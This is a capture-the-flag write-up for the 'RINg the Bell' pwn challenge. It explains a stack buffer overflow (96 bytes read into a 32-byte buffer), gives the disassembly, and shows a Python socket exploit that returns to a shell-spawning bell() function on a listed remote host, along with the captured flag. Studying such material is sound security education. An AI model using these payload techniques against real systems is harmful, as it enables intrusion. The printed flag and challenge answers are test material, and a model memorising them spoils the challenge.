# RINg the Bell — PWN

**CTF:** Cyber Apocalypse 2026  
**Category:** PWN  
**Challenge:** RINg the Bell  
**Flag:** `HTB{R1ng4_R1ng4_R1111111nG_cf3e6bf95292abfa906028d134d76607}`

---

## Scenario

Crownspire's fire-watch has one bell pattern that clears a street faster than any order could: three short tolls, a pause, then two long ones, the call for a granary fire, when every free hand is expected to run for water instead of posting stand. Rin got the pattern out of a watchman who'd had one drink too many. She doesn't need the gate garrison dead or even distracted for long, just gone, for exactly as long as it takes Keir's wagon to cross from the tannery gate to the river road with cargo nobody's supposed to see. The door to the bell tower wasn't built to keep strangers out. It was built to keep whoever's already inside from leaving on their own terms, which tells her plenty about who usually comes through here. She has one chance to get past it before that wagon reaches the river road. Get the pattern wrong, or ring it a beat late, and every guard in earshot will know there's no fire while Keir's cargo sits exposed in the open street. Breach the lock, climb to the bell, and ring the toll exactly as she memorized it, then get out before anyone starts asking why the granary isn't burning.

**Target:** `154.57.164.67:31909`

---

## Analysis

### The Binary

The challenge provides a local copy of the binary (`ring_the_bell`) along with a remote service at `154.57.164.67:31909`.

```
$ file ring_the_bell
ring_the_bell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

Key function symbols from the binary:

| Function | Address | Purpose |
|----------|---------|---------|
| `printstr` | `0x401296` | Typewriter effect — prints string char by char with 15ms delay |
| `info` | `0x4012ed` | Prints formatted info messages with `[Garran Voss]` prefix |
| `fail` | `0x401423` | Prints FAIL message |
| `success` | `0x401577` | Prints SUCCESS message |
| `bell` | `0x40176d` | **Spawns `/bin/sh`** via `execl("/bin/sh", "sh", NULL)` |
| `read_num` | `0x401708` | Reads 31 bytes from stdin, converts with `strtoul` |
| `main` | `0x40179b` | Main game loop |
| `setup` | `0x40182a` | Calls `cls()`, disables buffering, sets 4882s alarm |
| `cls` | `0x4016cb` | Clears screen via ANSI escape codes |

### The Vulnerability — Stack Buffer Overflow

The `main` function reveals an immediately exploitable vulnerability:

```asm
0x40179f: push rbp               ; save old rbp
0x4017a0: mov rbp, rsp           ; frame pointer
0x4017a3: sub rsp, 0x20          ; allocate 32 bytes for buffer
...
0x4017d9: mov qword [rbp-0x20], 0 ; clear buffer
0x4017e1: mov qword [rbp-0x18], 0
0x4017e9: mov qword [rbp-0x10], 0
0x4017f1: mov qword [rbp-8], 0
0x4017f9: lea rax, [rbp-0x20]    ; buffer at rbp-0x20
0x4017fd: mov edx, 0x60          ; READ 96 BYTES into 32-byte buffer!
0x401802: mov rsi, rax
0x401805: mov edi, 0             ; stdin
0x40180a: call read
```

| Variable | Value | Issue |
|----------|-------|-------|
| Buffer size | 32 bytes | `sub rsp, 0x20` |
| Bytes read | 96 bytes | `mov edx, 0x60` |
| Saved RBP | at `rbp` | 8 bytes |
| Return address | at `rbp+0x8` | 8 bytes |

The binary reads **96 bytes** into a **32-byte stack buffer**, giving us a 64-byte overflow past the buffer — more than enough to overwrite the saved RBP and return address.

### The Win Function

The `bell` function at `0x40176d` is the obvious target:

```asm
0x40176d: endbr64                 ; bell()
0x401771: push rbp
0x401772: mov rbp, rsp
0x401775: mov edx, 0              ; envp = NULL
0x40177a: lea rax, [rip+0x8de]   ; "sh"
0x401781: mov rsi, rax            ; argv[0] = "sh"
0x401784: lea rax, [rip+0x8d7]   ; "/bin/sh"
0x40178b: mov rdi, rax            ; path = "/bin/sh"
0x40178e: mov eax, 0
0x401793: call execl              ; execl("/bin/sh", "sh", NULL)
0x401798: nop
0x401799: pop rbp
0x40179a: ret
```

This calls `execl("/bin/sh", "sh", NULL)` — a straightforward shell spawn.

---

## Solution — Exploitation

### Stack Layout

```
Address       | Contents        | Offset from buffer start
--------------+-----------------+-----------------------
rbp-0x20      | buffer[0-31]    | 0-31  (32 bytes padding)
rbp           | saved old RBP   | 32-39 (8 bytes padding)
rbp+0x8       | return address  | 40-47 (overwrite with bell)
```

### Payload Construction

- 32 bytes to fill the buffer
- 8 bytes to overwrite saved RBP (can be anything)
- 8 bytes return address → `0x40176d` (bell function, little-endian)

Total: 48 bytes.

```python
payload = b'A' * 40 + b'\x6d\x17\x40\x00\x00\x00\x00\x00'
```

### Execution

```python
import socket

HOST = '154.57.164.67'
PORT = 31909

payload = b'A' * 40
payload += b'\x6d\x17\x40\x00\x00\x00\x00\x00'  # bell() → /bin/sh

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.recv(4096)                         # Receive banner + prompt
s.send(payload)                      # Overflow the buffer

s.send(b'id\n')                      # Execute commands in shell
s.send(b'ls\n')
s.send(b'cat flag.txt\n')
response = s.recv(8192)
print(response.decode())
```

### Output

```
[Garran Voss] Rin! Ring the bell to call for reinforcements!

[Rin]: 
[Garran Voss] D-d-did they hear us..?
uid=999(ctf) gid=999(ctf) groups=999(ctf)
flag.txt
ring_the_bell
HTB{R1ng4_R1ng4_R1111111nG_cf3e6bf95292abfa906028d134d76607}
```

---

## How We Solved It — Reasoning

1. **Initial interaction** — Connecting to the remote showed a narrative prompt about Rin needing to ring a bell with "three short tolls, a pause, then two long ones" — suggesting this might be a sequence-matching challenge.

2. **Binary analysis** — The local binary was a 64-bit ELF, not stripped, with clear function symbols. Disassembly revealed functions for `fail`, `success`, `bell`, `info`, `cls`, and `read_num`.

3. **Spotting the overflow** — The stack frame allocated only 32 bytes (`sub rsp, 0x20`) but `read` was called with `edx = 0x60` (96 bytes). This is a textbook buffer overflow: the programmer didn't match buffer size to read size.

4. **Identifying the target** — The `bell` function at `0x40176d` calls `execl("/bin/sh", ...)`, making it the ideal return target. Despite the name suggesting bell-ringing animation, `bell()` actually spawns a shell.

5. **Executing the exploit** — Sent 40 bytes of padding (32 for buffer + 8 for saved RBP) followed by the address of `bell()` in little-endian format. When `main` returned, execution redirected to `bell()` which spawned a shell, letting us read the flag.

6. **Key insight** — The challenge's narrative about bell patterns was a red herring. The real vulnerability was a simple stack buffer overflow — no need to decode bell-ringing sequences.

---

## Key Takeaways

- **Buffer size mismatch** is one of the most common and exploitable vulnerabilities. Always ensure `read()` requests match the allocated buffer size.
- **Not-stripped binaries** with function symbols make reverse engineering and exploitation substantially easier.
- **The narrative is not the vulnerability** — story elements in CTFs often serve as atmosphere rather than direct hints. Always analyze the binary mechanically.
- **The `bell` function name was misleading** — it spawned a shell rather than displaying an animation, demonstrating the value of checking all function bodies rather than assuming from names.
